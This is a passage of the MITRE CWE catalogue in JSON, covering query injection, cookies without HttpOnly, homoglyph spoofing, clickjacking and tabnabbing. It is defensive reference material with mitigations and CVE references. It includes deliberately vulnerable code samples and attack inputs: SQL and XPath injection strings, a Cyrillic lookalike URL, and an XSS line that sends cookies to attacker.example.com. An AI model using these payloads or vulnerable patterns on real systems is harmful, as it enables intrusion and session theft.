          "PublicationYear": "2011",
          "PublicationMonth": "05",
          "URL": "http://cseweb.ucsd.edu/~hovav/dist/crossdomain.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "943",
      "Name": "Improper Neutralization of Special Elements in Data Query Logic",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.",
      "ExtendedDescription": "\n\nDepending on the capabilities of the query language, an attacker could inject additional logic into the query to:\n\n\n  - Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulated\n\n  - Append additional commands to the query\n\n  - Return more entities than intended\n\n  - Return fewer entities than intended\n\n  - Cause entities to be sorted in an unexpected way\n\nThe ability to execute additional commands or change which entities are returned has obvious risks. But when the product logic depends on the order or number of entities, this can also lead to vulnerabilities. For example, if the query expects to return only one entity that specifies an administrative user, but an attacker can change which entities are returned, this could cause the logic to return information for a regular user and incorrectly assume that the user has administrative privileges.\n\nWhile this weakness is most commonly associated with SQL injection, there are many other query languages that are also subject to injection attacks, including HTSQL, LDAP, DQL, XQuery, Xpath, and \"NoSQL\" languages.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "74",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Read Application Data",
            "Modify Application Data",
            "Varies by Context"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-209",
          "Entries": [
            {
              "IntroText": "The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\t...\n\tstring userName = ctx.getAuthenticatedUserName();\n\tstring query = \"SELECT * FROM items WHERE owner = '\" + userName + \"' AND itemname = '\" + ItemName.Text + \"'\";\n\tsda = new SqlDataAdapter(query, conn);\n\tDataTable dt = new DataTable();\n\tsda.Fill(dt);\n\t...\n```"
            },
            {
              "BodyText": "The query that this code intends to execute follows:"
            },
            {
              "Nature": "Informative",
              "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;\n```"
            },
            {
              "BodyText": "However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\tname' OR 'a'='a\n```"
            },
            {
              "BodyText": "for itemName, then the query becomes the following:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';\n```"
            },
            {
              "BodyText": "The addition of the:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\tOR 'a'='a\n```"
            },
            {
              "BodyText": "condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\tSELECT * FROM items;\n```"
            },
            {
              "BodyText": "This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner."
            }
          ]
        },
        {
          "ID": "DX-210",
          "Entries": [
            {
              "IntroText": "The code below constructs an LDAP query using user input address data:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tcontext = new InitialDirContext(env);\n\tString searchFilter = \"StreetAddress=\" + address;\n\tNamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);\n```"
            },
            {
              "BodyText": "Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries."
            }
          ]
        },
        {
          "ID": "DX-211",
          "Entries": [
            {
              "IntroText": "Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:"
            },
            {
              "Nature": "Informative",
              "Language": "XML",
              "ExampleCode": "```\n\t<users>\n\t\t<user>\n\t\t\t<login>john</login>\n\t\t\t<password>abracadabra</password>\n\t\t\t<home_dir>/home/john</home_dir>\n\t\t</user>\n\t\t<user>\n\t\t\t<login>cbc</login>\n\t\t\t<password>1mgr8</password>\n\t\t\t<home_dir>/home/cbc</home_dir>\n\t\t</user>\n\t</users>\n```"
            },
            {
              "BodyText": "The Java code used to retrieve the home directory based on the provided credentials is:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tXPath xpath = XPathFactory.newInstance().newXPath();\n\tXPathExpression xlogin = xpath.compile(\"//users/user[login/text()='\" + login.getUserName() + \"' and password/text() = '\" + login.getPassword() + \"']/home_dir/text()\");\n\tDocument d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(\"db.xml\"));\n\tString homedir = xlogin.evaluate(d);\n```"
            },
            {
              "BodyText": "Assume that user \"john\" wishes to leverage XPath Injection and login without a valid password. By providing a username \"john\" and password \"' or ''='\" the XPath expression now becomes"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()\n```"
            },
            {
              "BodyText": "This lets user \"john\" login without a valid password, thus bypassing authentication."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2014-2503",
          "Description": "Injection using Documentum Query Language (DQL)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-2503"
        },
        {
          "Reference": "CVE-2014-2508",
          "Description": "Injection using Documentum Query Language (DQL)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-2508"
        }
      ],
      "RelatedAttackPatterns": [
        "676"
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "It could be argued that data query languages are effectively a command language - albeit with a limited set of commands - and thus any query-language injection issue could be treated as a child of CWE-74. However, CWE-943 is intended to better organize query-oriented issues to separate them from fully-functioning programming languages, and also to provide a more precise identifier for the many query languages that do not have their own CWE identifier."
        }
      ]
    },
    {
      "ID": "1004",
      "Name": "Sensitive Cookie Without 'HttpOnly' Flag",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.",
      "ExtendedDescription": "The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "732",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Leverage the HttpOnly flag when setting a sensitive cookie in a response.",
          "Effectiveness": "High",
          "EffectivenessNotes": "While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client."
            },
            {
              "BodyText": "The snippet of code below establishes a new cookie to hold the sessionID."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString sessionID = generateSessionId();\n\tCookie c = new Cookie(\"session_id\", sessionID);\n\tresponse.addCookie(c);\n```"
            },
            {
              "BodyText": "The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n\tdocument.write('<img src=\"http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '\">'\n```"
            },
            {
              "BodyText": "When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie."
            },
            {
              "BodyText": "To mitigate the risk, use the setHttpOnly(true) method."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tString sessionID = generateSessionId();\n\tCookie c = new Cookie(\"session_id\", sessionID);\n\tc.setHttpOnly(true);\n\tresponse.addCookie(c);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-24045",
          "Description": "Web application for a room automation system has client-side Javascript that sets a sensitive cookie without the HTTPOnly security attribute, allowing the cookie to be accessed.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-24045"
        },
        {
          "Reference": "CVE-2014-3852",
          "Description": "CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-3852"
        },
        {
          "Reference": "CVE-2015-4138",
          "Description": "Appliance for managing encrypted communications does not use HttpOnly flag.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2015-4138"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-2",
          "Authors": [
            "OWASP"
          ],
          "Title": "HttpOnly",
          "URL": "https://owasp.org/www-community/HttpOnly",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-3",
          "Authors": [
            "Michael Howard"
          ],
          "Title": "Some Bad News and Some Good News",
          "PublicationYear": "2002",
          "URL": "https://learn.microsoft.com/en-us/previous-versions/ms972826(v=msdn.10)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-4",
          "Authors": [
            "Troy Hunt"
          ],
          "Title": "C is for cookie, H is for hacker - understanding HTTP only and Secure cookies",
          "PublicationYear": "2013",
          "PublicationMonth": "03",
          "PublicationDay": "26",
          "URL": "https://www.troyhunt.com/c-is-for-cookie-h-is-for-hacker/"
        },
        {
          "ExternalReferenceID": "REF-5",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Mitigating Cross-site Scripting With HTTP-only Cookies",
          "URL": "https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1007",
      "Name": "Insufficient Visual Distinction of Homoglyphs Presented to User",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.",
      "ExtendedDescription": "\n\nSome glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase \"l\" (ell) and uppercase \"I\" (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter \"A\" and the Greek capital letter \"\u0391\" (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark \"\u00c0\" and its equivalent \"\u00c1\" with the acute accent.\n\n\nAdversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.\n",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "451",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Sometimes"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Homograph Attack",
          "Description": "\"Homograph\" is often used as a synonym of \"homoglyph\" by researchers, but according to Wikipedia, a homograph is a word that has multiple, distinct meanings."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "This weakness may occur when characters from various character sets are allowed to be interchanged within a URL, username, email address, etc. without any notification to the user or underlying system being used."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "An attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Manual Dynamic Analysis",
          "Description": "If utilizing user accounts, attempt to submit a username that contains homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via email, web browsers, or other mechanisms.",
          "Effectiveness": "Moderate"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nUse a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.\n\n\nDue to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.\n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nUse an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.\n\n\nCertain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder.\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following looks like a simple, trusted URL that a user may frequently access."
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\thttp://www.\u0435x\u0430m\u0440l\u0435.\u0441\u043em\n```"
            },
            {
              "BodyText": "However, the URL above is comprised of Cyrillic characters that look identical to the expected ASCII characters. This results in most users not being able to distinguish between the two and assuming that the above URL is trusted and safe. The \"e\" is actually the \"CYRILLIC SMALL LETTER IE\" which is represented in HTML as the character &#x435, while the \"a\" is actually the \"CYRILLIC SMALL LETTER A\" which is represented in HTML as the character &#x430. The \"p\", \"c\", and \"o\" are also Cyrillic characters in this example. Viewing the source reveals a URL of \"http://www.&#x435;x&#x430;m&#x440;l&#x435;.&#x441;&#x43e;m\". An adversary can utilize this approach to perform an attack such as a phishing attack in order to drive traffic to a malicious website."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following displays an example of how creating usernames containing homoglyphs can lead to log forgery."
            },
            {
              "BodyText": "Assume an adversary visits a legitimate, trusted domain and creates an account named \"admin\", except the 'a' and 'i' characters are Cyrillic characters instead of the expected ASCII. Any actions the adversary performs will be saved to the log file and look like they came from a legitimate administrator account."
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t123.123.123.123 \u0430dm\u0456n [17/Jul/2017:09:05:49 -0400] \"GET /example/users/userlist HTTP/1.1\" 401 12846\n\t 123.123.123.123 \u0430dm\u0456n [17/Jul/2017:09:06:51 -0400] \"GET /example/users/userlist HTTP/1.1\" 200 4523\n\t 123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291\n\t 123.123.123.123 \u0430dm\u0456n [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291\n```"
            },
            {
              "BodyText": "Upon closer inspection, the account that generated three of these log entries is \"&#x430;dm&#x456;n\". Only the third log entry is by the legitimate admin account. This makes it more difficult to determine which actions were performed by the adversary and which actions were executed by the legitimate \"admin\" account."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2013-7236",
          "Description": "web forum allows impersonation of users with homoglyphs in account names",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-7236"
        },
        {
          "Reference": "CVE-2012-0584",
          "Description": "Improper character restriction in URLs in web browser",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0584"
        },
        {
          "Reference": "CVE-2009-0652",
          "Description": "Incomplete denylist does not include homoglyphs of \"/\" and \"?\" characters in URLs",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0652"
        },
        {
          "Reference": "CVE-2017-5015",
          "Description": "web browser does not convert hyphens to punycode, allowing IDN spoofing in URLs",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5015"
        },
        {
          "Reference": "CVE-2005-0233",
          "Description": "homoglyph spoofing using punycode in URLs and certificates",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0233"
        },
        {
          "Reference": "CVE-2005-0234",
          "Description": "homoglyph spoofing using punycode in URLs and certificates",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0234"
        },
        {
          "Reference": "CVE-2005-0235",
          "Description": "homoglyph spoofing using punycode in URLs and certificates",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0235"
        }
      ],
      "RelatedAttackPatterns": [
        "632"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 11, \"Canonical Representation Issues\", Page 382",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-8",
          "Authors": [
            "Gregory Baatard",
            "Peter Hannay"
          ],
          "Title": "The 2011 IDN Homograph Attack Mitigation Survey",
          "PublicationYear": "2012",
          "Publisher": "ECU Publications",
          "URL": "http://ro.ecu.edu.au/cgi/viewcontent.cgi?article=1174&context=ecuworks2012"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1021",
      "Name": "Improper Restriction of Rendered UI Layers or Frames",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.",
      "ExtendedDescription": "A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "441",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "610",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "451",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Clickjacking"
        },
        {
          "Term": "UI Redress Attack"
        },
        {
          "Term": "Tapjacking",
          "Description": "\"Tapjacking\" is similar to clickjacking, except it is used for mobile applications in which the user \"taps\" the application instead of performing a mouse click."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity",
            "Bypass Protection Mechanism",
            "Read Application Data",
            "Modify Application Data"
          ],
          "Note": "An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nThe use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.\n\n\nThe concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains.\n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nA developer can use a \"frame-breaker\" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.\n\n\nIt is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The \"frame-breaking\" script does not intuitively account for multiple nested frames that can be presented to the user.\n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the \"frame-ancestors\" directive or the \"frame-src\" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2017-7440",
          "Description": "E-mail preview feature in a desktop application allows clickjacking attacks via a crafted e-mail message",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-7440"
        },
        {
          "Reference": "CVE-2017-5697",
          "Description": "Hardware/firmware product has insufficient clickjacking protection in its web user interface",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5697"
        },
        {
          "Reference": "CVE-2017-4015",
          "Description": "Clickjacking in data-loss prevention product via HTTP response header.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-4015"
        },
        {
          "Reference": "CVE-2016-2496",
          "Description": "Tapjacking in permission dialog for mobile OS allows access of private storage using a partially-overlapping window.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2016-2496"
        },
        {
          "Reference": "CVE-2015-1241",
          "Description": "Tapjacking in web browser related to page navigation and touch/gesture events.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2015-1241"
        },
        {
          "Reference": "CVE-2017-0492",
          "Description": "System UI in mobile OS allows a malicious application to create a UI overlay of the entire screen to gain privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-0492"
        }
      ],
      "RelatedAttackPatterns": [
        "103",
        "181",
        "222",
        "504",
        "506",
        "587",
        "654"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-35",
          "Authors": [
            "Andrew Horton"
          ],
          "Title": "Clickjacking For Shells",
          "URL": "https://www.exploit-db.com/docs/17881.pdf"
        },
        {
          "ExternalReferenceID": "REF-36",
          "Authors": [
            "OWASP"
          ],
          "Title": "Clickjacking - OWASP",
          "URL": "https://owasp.org/www-community/attacks/Clickjacking",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-37",
          "Authors": [
            "Internet Security"
          ],
          "Title": "SecTheory",
          "URL": "https://www.sectheory.com/clickjacking.htm",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-38",
          "Authors": [
            "W3C"
          ],
          "Title": "Content Security Policy Level 3",
          "URL": "https://w3c.github.io/webappsec-csp/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1022",
      "Name": "Use of Web Link to Untrusted Target with window.opener Access",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying  security-critical properties of the window.opener object, such as the location property.",
      "ExtendedDescription": "When a user clicks a link to an external site (\"target\"), the target=\"_blank\" attribute causes the target site's contents to be opened in a new window or tab, which runs in the same process as the original page. The window.opener object records information about the original page that offered the link. If an attacker can run script on the target page, then they could read or modify certain properties of the window.opener object, including the location property - even if the original and target site are not the same origin. An attacker can modify the location property to automatically redirect the user to a malicious site, e.g. as part of a phishing attack. Since this redirect happens in the original window/tab - which is not necessarily visible, since the browser is focusing the display on the new target page - the user might not notice any suspicious redirection.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "266",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "JavaScript",
          "Prevalence": "Often"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Often"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "tabnabbing"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "This weakness is introduced during the design of an application when the architect does not specify that a linked external document should not be able to alter the location of the calling page."
        },
        {
          "Phase": "Implementation",
          "Note": "This weakness is introduced during the coding of an application when the developer does not include the noopener and/or noreferrer value for the rel attribute."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Alter Execution Logic"
          ],
          "Note": "The user may be redirected to an untrusted page that contains undesired content or malicious script code."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
